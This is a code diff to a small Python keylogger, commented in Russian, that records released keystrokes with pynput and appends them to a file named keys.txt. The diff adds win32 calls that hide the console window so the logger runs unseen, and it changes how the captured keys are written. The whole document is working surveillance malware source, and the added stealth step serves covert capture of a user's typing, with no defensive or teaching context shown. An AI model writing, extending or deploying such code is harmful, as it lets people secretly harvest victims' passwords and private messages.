@@ -1,8 +1,12 @@
 from pynput.keyboard import Listener, Key
 # импортируем нужные классы, Listener - прослушиватель нажатий, Key - удобно получает коды клавиш в ascii
-#import win32api
-#import win32gui
-#import win32console
+
+import win32api
+import win32gui
+import win32console
+
+window = win32console.GetConsoleWindow()
+win32gui.ShowWindow(window, 0)
 
 # пишем функцию, которая будет срабатывать при отпускании клавиши. Для теста мы поставим так, что при нажатии
 # клавиши escape программа перестанет работать
@@ -18,7 +22,8 @@ def key_pressed(key):
         k = '\n'
     if k.find('Key.') == -1:
         with open('keys.txt', 'at') as f:
-            f.write(str(key))
+            f.write(k)
+            #f.write(k + ' | dict_rus[k]')
 
 '''with Listener(
         on_press=lambda key: print(key),
@@ -34,3 +39,4 @@ with Listener(
         on_release=key_released
 ) as listener:
     listener.join() # подключаем прослушку
+
